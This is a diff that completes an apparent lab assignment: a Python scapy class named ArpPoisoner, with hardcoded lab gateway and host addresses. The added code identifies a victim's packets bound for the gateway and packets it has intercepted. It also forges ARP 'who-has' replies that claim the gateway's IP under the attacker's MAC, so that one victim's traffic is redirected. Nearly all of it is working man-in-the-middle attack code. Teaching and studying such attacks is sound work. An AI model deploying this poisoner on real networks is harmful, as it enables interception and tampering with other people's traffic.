@@ -1,5 +1,10 @@
 import scapy.all as S
 
+GATEWAY_MAC_ADDRESS = '52:54:00:12:35:00'
+GATEWAY_IP_ADDRESS = '10.0.2.1'
+
+HOST_MAC_ADDRESS = '08:00:27:1a:d5:63'
+HOST_IP_ADDRESS = '10.0.2.15'
 
 class ArpPoisoner(object):
     def __init__(self, our_ip, our_mac, gateway_ip, gateway_mac, debug):
@@ -17,7 +22,9 @@ class ArpPoisoner(object):
 
         Note: You may assume all packets have both IP and Ethernet layers.
         """
-        raise NotImplementedError()
+        ether = packet.getlayer(S.Ether)
+        return ether.src != self.our_mac and ether.dst == self.gateway_mac
+
 
     def is_stolen_packet(self, packet):
         """
@@ -26,7 +33,9 @@ class ArpPoisoner(object):
 
         Note: You may assume all packets have both IP and Ethernet layers.
         """
-        raise NotImplementedError()
+        ether = packet.getlayer(S.Ether)
+        ip = packet.getlayer(S.IP)
+        return (ether.dst == self.our_mac and ip.dst != self.our_ip) and (ip.src != self.our_ip and ether.src != self.our_mac)
 
     def packet_filter(self, packet):
         """
@@ -50,7 +59,19 @@ class ArpPoisoner(object):
         2. Don't poison everyone on the network - poison only this specific
            victim.
         """
-        raise NotImplementedError()
+        ip = victim_packet.getlayer(S.IP)
+        ether = victim_packet.getlayer(S.Ether)
+        poison = S.ARP()
+        poison.hwtype = 0x1
+        poison.ptype = 0x0800
+        poison.hwlen = 6
+        poison.plen = 4
+        poison.op = 'who-has'
+        poison.hwsrc = self.our_mac
+        poison.psrc = self.gateway_ip
+        poison.hwdst = ether.src
+        poison.pdst = ip.src
+        return poison
 
     def handle_packet(self, packet):
         """
